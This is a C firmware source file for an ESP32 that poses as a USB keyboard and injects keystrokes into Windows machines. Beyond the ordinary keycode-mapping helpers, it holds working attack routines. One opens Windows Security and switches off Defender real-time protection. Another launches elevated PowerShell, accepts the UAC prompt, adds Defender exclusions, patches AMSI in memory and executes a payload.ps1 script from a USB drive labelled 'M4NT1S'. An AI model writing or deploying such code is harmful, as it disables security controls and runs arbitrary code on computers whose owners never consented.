// main/hid_payload.c
#include "hid_payload.h"
#include "tusb.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

static const char *TAG = "hid_payload";
static volatile bool s_enabled = false;
static hid_layout_t s_layout = HID_LAYOUT_UK;

const uint8_t s_hid_report_descriptor[HID_REPORT_DESC_LEN] = {
    0x05, 0x01, 0x09, 0x06, 0xA1, 0x01, 0x05, 0x07, 0x19, 0xE0,
    0x29, 0xE7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08,
    0x81, 0x02, 0x95, 0x01, 0x75, 0x08, 0x81, 0x01, 0x95, 0x06,
    0x75, 0x08, 0x15, 0x00, 0x25, 0x65, 0x05, 0x07, 0x19, 0x00,
    0x29, 0x65, 0x81, 0x00, 0xC0
};

uint8_t const *tud_hid_descriptor_report_cb(uint8_t instance) {
    (void)instance;
    return s_hid_report_descriptor;
}

uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id,
                               hid_report_type_t report_type,
                               uint8_t *buffer, uint16_t reqlen) {
    (void)instance; (void)report_id; (void)report_type;
    (void)buffer; (void)reqlen;
    return 0;
}

void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id,
                           hid_report_type_t report_type,
                           uint8_t const *buffer, uint16_t bufsize) {
    (void)instance; (void)report_id; (void)report_type;
    (void)buffer; (void)bufsize;
}

// 1s cap. If USB is unmounted we bail immediately rather than waiting the
// full window, so a mid-payload disconnect cannot wedge the task for
// minutes (previous 5s * 3 retries per failed char = ~15s/char).
static bool wait_ready(void) {
    for (int i = 0; i < 200; i++) {  // 200 * 5ms = 1s
        if (!tud_mounted()) return false;
        if (tud_hid_ready()) return true;
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    ESP_LOGE(TAG, "HID timeout: host not ready after 1s");
    return false;
}

static bool send_report(uint8_t modifier, const uint8_t keys[6]) {
    if (!wait_ready()) return false;
    uint8_t report[8] = { modifier, 0, keys[0], keys[1], keys[2], keys[3], keys[4], keys[5] };
    return tud_hid_report(0, report, sizeof(report));
}

static void release_keys(void) {
    uint8_t none[6] = { 0 };
    send_report(0, none);
    vTaskDelay(pdMS_TO_TICKS(15));
}

static void release_keys_slow(void) {
    uint8_t none[6] = { 0 };
    send_report(0, none);
    vTaskDelay(pdMS_TO_TICKS(50));
}

// Keycode mapping. Shared between US and UK except for six characters
// where the physical key positions differ:
//
//   char   US                UK
//   "      Shift+0x34        Shift+0x1F
//   @      Shift+0x1F        Shift+0x34
//   #      Shift+0x20        0x31
//   ~      Shift+0x35        Shift+0x31
//   \      0x31              0x64
//   |      Shift+0x31        Shift+0x64
//
// s_layout is read here — previously it was written by set_layout() and
// never consulted, so HID_LAYOUT_US silently produced UK output.
static bool type_char(char c) {
    uint8_t modifier = 0;
    uint8_t key = 0;

    // Identical on US and UK
    if (c >= 'a' && c <= 'z') { key = 0x04 + (c - 'a'); }
    else if (c >= 'A' && c <= 'Z') { key = 0x04 + (c - 'A'); modifier = 0x02; }
    else if (c >= '1' && c <= '9') { key = 0x1E + (c - '1'); }
    else if (c == '0') { key = 0x27; }
    else if (c == ' ') { key = 0x2C; }
    else if (c == '-') { key = 0x2D; }
    else if (c == '=') { key = 0x2E; }
    else if (c == '[') { key = 0x2F; }
    else if (c == ']') { key = 0x30; }
    else if (c == ';') { key = 0x33; }
    else if (c == '\'') { key = 0x34; }
    else if (c == '`') { key = 0x35; }
    else if (c == ',') { key = 0x36; }
    else if (c == '.') { key = 0x37; }
    else if (c == '/') { key = 0x38; }
    else if (c == '!') { key = 0x1E; modifier = 0x02; }
    else if (c == '$') { key = 0x21; modifier = 0x02; }
    else if (c == '%') { key = 0x22; modifier = 0x02; }
    else if (c == '^') { key = 0x23; modifier = 0x02; }
    else if (c == '&') { key = 0x24; modifier = 0x02; }
    else if (c == '*') { key = 0x25; modifier = 0x02; }
    else if (c == '(') { key = 0x26; modifier = 0x02; }
    else if (c == ')') { key = 0x27; modifier = 0x02; }
    else if (c == '_') { key = 0x2D; modifier = 0x02; }
    else if (c == '+') { key = 0x2E; modifier = 0x02; }
    else if (c == '{') { key = 0x2F; modifier = 0x02; }
    else if (c == '}') { key = 0x30; modifier = 0x02; }
    else if (c == ':') { key = 0x33; modifier = 0x02; }
    else if (c == '<') { key = 0x36; modifier = 0x02; }
    else if (c == '>') { key = 0x37; modifier = 0x02; }
    else if (c == '?') { key = 0x38; modifier = 0x02; }
    // Layout-dependent
    else if (c == '@') {
        if (s_layout == HID_LAYOUT_UK) { key = 0x34; modifier = 0x02; }
        else                           { key = 0x1F; modifier = 0x02; }
    }
    else if (c == '"') {
        if (s_layout == HID_LAYOUT_UK) { key = 0x1F; modifier = 0x02; }
        else                           { key = 0x34; modifier = 0x02; }
    }
    else if (c == '#') {
        if (s_layout == HID_LAYOUT_UK) { key = 0x31; }
        else                           { key = 0x20; modifier = 0x02; }
    }
    else if (c == '~') {
        if (s_layout == HID_LAYOUT_UK) { key = 0x31; modifier = 0x02; }
        else                           { key = 0x35; modifier = 0x02; }
    }
    else if (c == '\\') {
        if (s_layout == HID_LAYOUT_UK) { key = 0x64; }
        else                           { key = 0x31; }
    }
    else if (c == '|') {
        if (s_layout == HID_LAYOUT_UK) { key = 0x64; modifier = 0x02; }
        else                           { key = 0x31; modifier = 0x02; }
    }
    else {
        // Unknown byte: log so it's visible in the console instead of
        // vanishing silently.
        ESP_LOGW(TAG, "unsupported char 0x%02x ('%c')", (uint8_t)c, c);
        return true;
    }

    if (key == 0) return true;

    for (int attempt = 0; attempt < 3; attempt++) {
        if (!tud_mounted()) {
            ESP_LOGE(TAG, "USB dismounted mid-string");
            return false;
        }
        uint8_t keys[6] = { key, 0, 0, 0, 0, 0 };
        if (send_report(modifier, keys)) {
            vTaskDelay(pdMS_TO_TICKS(10));
            release_keys();
            return true;
        }
        ESP_LOGW(TAG, "retry char '%c' (attempt %d)", c, attempt + 1);
        vTaskDelay(pdMS_TO_TICKS(300));
    }
    ESP_LOGE(TAG, "GAVE UP on char '%c' (0x%02x)", c, (uint8_t)c);
    return false;
}

void hid_payload_init(void) { ESP_LOGI(TAG, "HID payload ready"); }
void hid_payload_enable(bool en) { s_enabled = en; }
bool hid_payload_is_enabled(void) { return s_enabled; }
void hid_payload_set_layout(hid_layout_t layout) { s_layout = layout; }

void hid_payload_send_string(const char *str) {
    if (!s_enabled || !str) return;
    if (!tud_mounted()) {
        ESP_LOGE(TAG, "USB not mounted, aborting string");
        return;
    }
    size_t len = strlen(str);
    for (size_t i = 0; i < len; i++) {
        if (!type_char(str[i])) {
            ESP_LOGE(TAG, "string aborted at char %u/%u", (unsigned)i, (unsigned)len);
            return;
        }
    }
    ESP_LOGI(TAG, "string typed OK (%u chars)", (unsigned)len);
}

void hid_payload_send_win_r(void) {
    if (!s_enabled) return;
    release_keys();
    uint8_t none[6] = { 0 };
    send_report(0x08, none);
    vTaskDelay(pdMS_TO_TICKS(60));
    uint8_t r_key[6] = { 0x15, 0, 0, 0, 0, 0 };
    send_report(0x08, r_key);
    vTaskDelay(pdMS_TO_TICKS(60));
    release_keys();
    vTaskDelay(pdMS_TO_TICKS(1200));
}

void hid_payload_send_enter(void) {
    if (!s_enabled) return;
    uint8_t enter_key[6] = { 0x28, 0, 0, 0, 0, 0 };
    send_report(0, enter_key);
    vTaskDelay(pdMS_TO_TICKS(30));
    release_keys();
}

void hid_payload_send_ctrl_shift_enter(void) {
    if (!s_enabled) return;
    release_keys();
    uint8_t none[6] = { 0 };
    send_report(0x03, none);
    vTaskDelay(pdMS_TO_TICKS(50));
    uint8_t enter_key[6] = { 0x28, 0, 0, 0, 0, 0 };
    send_report(0x03, enter_key);
    vTaskDelay(pdMS_TO_TICKS(50));
    release_keys_slow();
}

void hid_payload_send_tab(void) {
    if (!s_enabled) return;
    uint8_t tab_key[6] = { 0x2B, 0, 0, 0, 0, 0 };
    send_report(0, tab_key);
    vTaskDelay(pdMS_TO_TICKS(30));
    release_keys();
    vTaskDelay(pdMS_TO_TICKS(80));
}

void hid_payload_send_space(void) {
    if (!s_enabled) return;
    uint8_t space_key[6] = { 0x2C, 0, 0, 0, 0, 0 };
    send_report(0, space_key);
    vTaskDelay(pdMS_TO_TICKS(30));
    release_keys();
    vTaskDelay(pdMS_TO_TICKS(80));
}

void hid_payload_send_left_arrow(void) {
    if (!s_enabled) return;
    uint8_t left_key[6] = { 0x50, 0, 0, 0, 0, 0 };
    send_report(0, left_key);
    vTaskDelay(pdMS_TO_TICKS(30));
    release_keys();
    vTaskDelay(pdMS_TO_TICKS(80));
}

void hid_payload_disable_realtime_protection(void) {
    if (!s_enabled) return;
    hid_payload_send_win_r();
    hid_payload_send_string("windowsdefender://threat");
    vTaskDelay(pdMS_TO_TICKS(300));
    hid_payload_send_enter();
    vTaskDelay(pdMS_TO_TICKS(1200));
    for (int i = 0; i < 4; i++) hid_payload_send_tab();
    hid_payload_send_enter();
    vTaskDelay(pdMS_TO_TICKS(300));
    hid_payload_send_space();
    vTaskDelay(pdMS_TO_TICKS(300));
    hid_payload_send_left_arrow();
    vTaskDelay(pdMS_TO_TICKS(300));
    hid_payload_send_enter();
    vTaskDelay(pdMS_TO_TICKS(300));
    hid_payload_send_alt_f4();
    vTaskDelay(pdMS_TO_TICKS(3750));
}
void hid_payload_send_escape(void) {
    if (!s_enabled) return;
    release_keys();
    uint8_t esc_key[6] = { 0x29, 0, 0, 0, 0, 0 };
    send_report(0, esc_key);
    vTaskDelay(pdMS_TO_TICKS(30));
    release_keys();
    vTaskDelay(pdMS_TO_TICKS(200));
}

void hid_payload_send_alt_f4(void) {
    if (!s_enabled) return;
    release_keys();
    uint8_t none[6] = { 0 };
    send_report(0x04, none);
    vTaskDelay(pdMS_TO_TICKS(50));
    uint8_t f4_key[6] = { 0x3D, 0, 0, 0, 0, 0 };
    send_report(0x04, f4_key);
    vTaskDelay(pdMS_TO_TICKS(50));
    release_keys_slow();
}

void hid_payload_send_win_shift_v(void) {
    if (!s_enabled) return;
    release_keys();
    uint8_t none[6] = { 0 };
    send_report(0x0A, none);
    vTaskDelay(pdMS_TO_TICKS(30));
    uint8_t v_key[6] = { 0x19, 0, 0, 0, 0, 0 };
    send_report(0x0A, v_key);
    vTaskDelay(pdMS_TO_TICKS(30));
    release_keys_slow();
}

void hid_payload_send_alt_tab(void) {
    if (!s_enabled) return;
    release_keys();
    uint8_t none[6] = { 0 };
    send_report(0x04, none);  // Alt held
    vTaskDelay(pdMS_TO_TICKS(30));
    uint8_t tab_key[6] = { 0x2B, 0, 0, 0, 0, 0 };
    send_report(0x04, tab_key);  // Alt + Tab
    vTaskDelay(pdMS_TO_TICKS(30));
    release_keys_slow();
}

void hid_payload_run_admin_payload(void) {
    if (!s_enabled) return;

    // Dismiss the "real-time protection is off" notification before opening PowerShell
    hid_payload_send_win_shift_v();
    vTaskDelay(pdMS_TO_TICKS(500));
    for (int i = 0; i < 3; i++) hid_payload_send_tab();
    hid_payload_send_enter();
    vTaskDelay(pdMS_TO_TICKS(500));

    // Open elevated PowerShell
    hid_payload_send_win_r();
    hid_payload_send_string("powershell");
    vTaskDelay(pdMS_TO_TICKS(300));
    hid_payload_send_ctrl_shift_enter();
    vTaskDelay(pdMS_TO_TICKS(2500));

    // Accept UAC: Left Arrow moves focus to "Yes", Enter confirms
    hid_payload_send_left_arrow();
    vTaskDelay(pdMS_TO_TICKS(300));
    hid_payload_send_enter();
    vTaskDelay(pdMS_TO_TICKS(2500));

    hid_payload_send_string("Add-MpPreference -ExclusionPath 'C:\\ProgramData\\Microsoft\\DeviceMetadata' -EA SilentlyContinue;$d=$null;for($i=0;$i-lt30-and-not$d;$i++){$c=gcim Win32_LogicalDisk -EA SilentlyContinue|?{$_.DriveType -eq 2 -and $_.VolumeName -eq 'M4NT1S'};foreach($x in $c){if($x.DeviceID-and(Test-Path \"$($x.DeviceID)\\payload.ps1\")){Add-MpPreference -ExclusionPath $x.DeviceID -EA SilentlyContinue;$d=$x.DeviceID;break}};if(-not$d){sleep 1}};$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiContext','NonPublic,Static');$c=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt64($c,8,0);if($d){iex(Get-Content \"$d\\payload.ps1\" -Raw)}");
    hid_payload_send_enter();
}
void hid_payload_send_alt_y(void) {
    if (!s_enabled) return;
    release_keys();
    uint8_t none[6] = { 0 };
    send_report(0x04, none);
    vTaskDelay(pdMS_TO_TICKS(50));
    uint8_t y_key[6] = { 0x1C, 0, 0, 0, 0, 0 };
    send_report(0x04, y_key);
    vTaskDelay(pdMS_TO_TICKS(50));
    release_keys_slow();
}